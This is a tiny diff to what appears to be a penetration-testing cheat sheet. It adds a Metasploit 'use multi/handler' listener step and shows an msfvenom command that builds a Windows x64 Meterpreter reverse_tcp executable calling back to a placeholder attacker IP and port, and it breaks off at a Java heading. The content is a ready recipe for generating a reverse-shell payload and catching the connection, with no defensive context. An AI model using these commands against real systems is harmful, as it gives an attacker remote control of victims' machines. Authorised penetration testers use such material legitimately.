@@ -1,4 +1,6 @@
-#!/bin/bash
+# Start handler:
+use multi/handler
+
 # Windows
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] -f .exe -o [output.exe]
 # Java
